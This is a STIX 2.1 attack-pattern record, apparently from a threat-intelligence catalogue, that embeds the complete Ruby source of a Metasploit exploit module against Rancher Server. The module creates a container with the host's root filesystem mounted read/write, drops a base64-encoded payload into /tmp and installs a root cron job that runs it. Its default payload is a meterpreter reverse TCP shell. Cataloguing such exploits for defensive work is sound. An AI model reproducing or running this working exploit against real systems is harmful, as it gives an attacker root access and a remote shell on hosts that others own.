{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--72b9d360-1893-46ab-a12b-bbe813a2da16",
    "created": "2024-08-14T17:02:22.628818Z",
    "modified": "2024-08-14T17:02:22.628821Z",
    "name": "Rancher Server - Docker Exploit",
    "description": "( Utilizing Rancher Server, an attacker can create a docker container with the '/' path mounted with read/write permissions on the host server that is running the docker container. As the docker container executes command as uid 0 it is honored by the host operating system allowing the attacker to edit/create files owed by root. This exploit abuses this to creates a cron job in the '/etc/cron.d/' path of the host server.  The Docker image should exist on the target system or be a valid image from hub.docker.com.  Use `check` with verbose mode to get a list of exploitable Rancher Hosts managed by the target system. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/rancher_server.rb",
            "external_id": "rancher_server.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'             => 'Rancher Server - Docker Exploit',\n      'Description'      => %q(\n        Utilizing Rancher Server, an attacker can create a docker container\n        with the '/' path mounted with read/write permissions on the host\n        server that is running the docker container. As the docker container\n        executes command as uid 0 it is honored by the host operating system\n        allowing the attacker to edit/create files owed by root. This exploit\n        abuses this to creates a cron job in the '/etc/cron.d/' path of the\n        host server.\n\n        The Docker image should exist on the target system or be a valid image\n        from hub.docker.com.\n\n        Use `check` with verbose mode to get a list of exploitable Rancher\n        Hosts managed by the target system.\n      ),\n      'Author'           => 'Martin Pizala', # started with dcos_marathon module from Erik Daguerre\n      'License'          => MSF_LICENSE,\n      'References'       => [\n        'URL'            => 'https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface'\n      ],\n      'Platform'         => 'linux',\n      'Arch'             => [ARCH_X64],\n      'Payload'          => { 'Space' => 65000 },\n      'Targets'          => [[ 'Linux', {} ]],\n      'DefaultOptions'   => { 'WfsDelay' => 75, 'Payload' => 'linux/x64/meterpreter/reverse_tcp' },\n      'DefaultTarget'    => 0,\n      'DisclosureDate'   => '2017-07-27'))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETENV', [ true, 'Target Rancher Environment', '1a5' ]),\n        OptString.new('TARGETHOST', [ true, 'Target Rancher Host', '1h1' ]),\n        OptString.new('DOCKERIMAGE', [ true, 'hub.docker.com image to use', 'alpine:latest' ]),\n        OptString.new('CONTAINER_ID', [ false, 'container id you would like']),\n        OptString.new('HttpUsername', [false, 'Rancher API Access Key (Username)']),\n        OptString.new('HttpPassword', [false, 'Rancher API Secret Key (Password)'])\n      ]\n    )\n    register_advanced_options(\n      [\n        OptString.new('TARGETURI', [ true, 'Rancher API Path', '/v1/projects' ]),\n        OptInt.new('WAIT_TIMEOUT', [ true, 'Time in seconds to wait for the docker container to deploy', 60 ])\n      ]\n    )\n  end\n\n  def del_container(rancher_container_id, container_id)\n    res = send_request_cgi(\n      'method'  => 'DELETE',\n      'uri'     => normalize_uri(target_uri.path, datastore['TARGETENV'], 'containers', rancher_container_id),\n      'ctype'   => 'application/json',\n      'headers' => { 'Accept' => 'application/json' }\n    )\n\n    return vprint_good('The docker container has been removed.') if res && res.code == 200\n\n    print_warning(\"Manual cleanup of container \\\"#{container_id}\\\" is needed on the target.\")\n  end\n\n  def make_container_id\n    return datastore['CONTAINER_ID'] unless datastore['CONTAINER_ID'].nil?\n\n    rand_text_alpha_lower(8)\n  end\n\n  def make_cmd(mnt_path, cron_path, payload_path)\n    vprint_status('Creating the docker container command')\n    echo_cron_path = mnt_path + cron_path\n    echo_payload_path = mnt_path + payload_path\n\n    command = \"echo #{Rex::Text.encode_base64(payload.encoded_exe)} | base64 -d > #{echo_payload_path} \\&\\& chmod +x #{echo_payload_path} \\&\\& \"\n    command << \"echo \\\"PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin\\\" >> #{echo_cron_path} \\&\\& \"\n    command << \"echo \\\"\\\" >> #{echo_cron_path} \\&\\& \"\n    command << \"echo \\\"* * * * * root #{payload_path}\\\" >> #{echo_cron_path}\"\n\n    command\n  end\n\n  def make_container(mnt_path, cron_path, payload_path, container_id)\n    vprint_status('Setting container json request variables')\n    {\n      'instanceTriggeredStop'           => 'stop',\n      'startOnCreate'                   => true,\n      'networkMode'                     => 'managed',\n      'requestedHostId'                 => datastore['TARGETHOST'],\n      'type'                            => 'container',\n      'dataVolumes'                     => [ '/:' + mnt_path ],\n      'imageUuid'                       => 'docker:' + datastore['DOCKERIMAGE'],\n      'name'                            => container_id,\n      'command'                         => make_cmd(mnt_path, cron_path, payload_path),\n      'entryPoint'                      => %w[sh -c]\n    }\n  end\n\n  def check\n    res = send_request_cgi(\n      'method'  => 'GET',\n      'uri'     => normalize_uri(target_uri.path),\n      'ctype'   => 'application/json',\n      'headers' => { 'Accept' => 'application/json' }\n    )\n\n    if res.nil?\n      print_error('Failed to connect to the target')\n      return Exploit::CheckCode::Unknown\n    end\n\n    if res.code == 401 && res.headers.to_json.include?('X-Rancher-Version')\n      print_error('Authorization is required. Provide valid Rancher API Keys.')\n      return Exploit::CheckCode::Detected\n    end\n\n    if res.code == 200 && res.headers.to_json.include?('X-Rancher-Version')\n      target_found = false\n      target_selected = false\n\n      environments = JSON.parse(res.body)['data']\n      environments.each do |e|\n        res = send_request_cgi(\n          'method'  => 'GET',\n          'uri'     => normalize_uri(target_uri.path, e['id'], 'hosts'),\n          'ctype'   => 'application/json',\n          'headers' => { 'Accept' => 'application/json' }\n        )\n\n        hosts = JSON.parse(res.body)['data']\n        hosts.each do |h|\n          target_found = true\n          result = \"Rancher Host \\\"#{h['hostname']}\\\" (TARGETHOST #{h['id']}) on \"\n          result << \"Environment \\\"#{e['name']}\\\" (TARGETENV #{e['id']}) found\"\n\n          # flag results when this host is targeted via options\n          if datastore['TARGETENV'] == e['id'] && datastore['TARGETHOST'] == h['id']\n            target_selected = true\n            vprint_good(result + ' %red<-- targeted%clr')\n          else\n            vprint_good(result)\n          end\n        end\n      end\n\n      if target_found\n        return Exploit::CheckCode::Vulnerable if target_selected\n\n        print_bad(\"Your TARGETENV \\\"#{datastore['TARGETENV']}\\\" or/and TARGETHOST \\\"#{datastore['TARGETHOST']}\\\" is not available\")\n        if datastore['VERBOSE'] == false\n          print_bad('Try verbose mode to know what happened.')\n        end\n        vprint_bad('Choose a TARGETHOST and TARGETENV from the results above')\n        return Exploit::CheckCode::Appears\n      else\n        print_bad('No TARGETHOST available')\n        return Exploit::CheckCode::Detected\n      end\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    unless check == Exploit::CheckCode::Vulnerable\n      fail_with(Failure::Unknown, 'Failed to connect to the target')\n    end\n\n    # create required information to create json container information\n    cron_path = '/etc/cron.d/' + rand_text_alpha(8)\n    payload_path = '/tmp/' + rand_text_alpha(8)\n    mnt_path = '/mnt/' + rand_text_alpha(8)\n    container_id = make_container_id\n\n    # deploy docker container\n    res = send_request_cgi(\n      'method'  => 'POST',\n      'uri'     => normalize_uri(target_uri.path, datastore['TARGETENV'], 'containers'),\n      'ctype'   => 'application/json',\n      'headers' => { 'Accept' => 'application/json' },\n      'data'    => make_container(mnt_path, cron_path, payload_path, container_id).to_json\n    )\n    fail_with(Failure::Unknown, 'Failed to create the docker container') unless res && res.code == 201\n\n    print_good('The docker container is created, waiting for it to deploy')\n\n    # cleanup\n    register_files_for_cleanup(cron_path, payload_path)\n\n    rancher_container_id = JSON.parse(res.body)['id']\n    deleted_container = false\n\n    sleep_time = 5\n    wait_time = datastore['WAIT_TIMEOUT']\n    vprint_status(\"Waiting up to #{wait_time} seconds until the docker container stops\")\n\n    while wait_time > 0\n      sleep(sleep_time)\n      wait_time -= sleep_time\n\n      res = send_request_cgi(\n        'method'  => 'GET',\n        'uri'     => normalize_uri(target_uri.path, datastore['TARGETENV'], 'containers', '?name=' + container_id),\n        'ctype'   => 'application/json',\n        'headers' => { 'Accept' => 'application/json' }\n      )\n      next unless res && res.code == 200 && res.body.include?('stopped')\n\n      vprint_good('The docker container has stopped, now trying to remove it')\n      del_container(rancher_container_id, container_id)\n      deleted_container = true\n      wait_time = 0\n    end\n\n    # if container does not deploy, try to remove it and fail out\n    unless deleted_container\n      del_container(rancher_container_id, container_id)\n      fail_with(Failure::Unknown, \"The docker container failed to start\")\n    end\n\n    print_status('Waiting for the cron job to run, can take up to 60 seconds')\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-07-27",
    "x_mitre_platforms": [
        "linux'"
    ]
}